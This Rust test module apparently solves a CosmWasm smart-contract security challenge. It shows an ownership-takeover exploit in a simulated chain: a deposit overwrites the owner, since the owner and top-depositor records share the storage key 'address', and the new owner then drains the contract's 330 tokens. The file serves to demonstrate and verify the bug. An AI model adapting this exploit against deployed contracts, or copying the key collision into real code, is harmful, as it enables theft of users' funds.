#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::DENOM,
        integration_tests::tests::{base_scenario, PLAYER},
        msg::{ConfigQueryResponse, ExecuteMsg, QueryMsg},
    };
    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Uint128};
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = base_scenario();

        let player = Addr::unchecked(PLAYER);

        // the key of TOP_DEPOSITOR: "address"
        // the key of OWNER: "address"
        // so we can overwrite the OWNER by setting the TOP_DEPOSITOR
        app.execute_contract(
            player.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(120, DENOM)],
        )
        .unwrap();

        let owner: Addr = app
            .wrap()
            .query_wasm_smart::<ConfigQueryResponse>(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap()
            .owner;
        assert_eq!(owner, PLAYER);

        let balance = app
            .wrap()
            .query_balance(contract_addr.clone(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(330));

        let msg = CosmosMsg::Bank(BankMsg::Send {
            to_address: player.to_string(),
            amount: vec![balance],
        });

        app.execute_contract(
            Addr::unchecked(PLAYER),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg },
            &[],
        )
        .unwrap();

        let balance = app
            .wrap()
            .query_balance(contract_addr.clone(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::zero());
    }
}
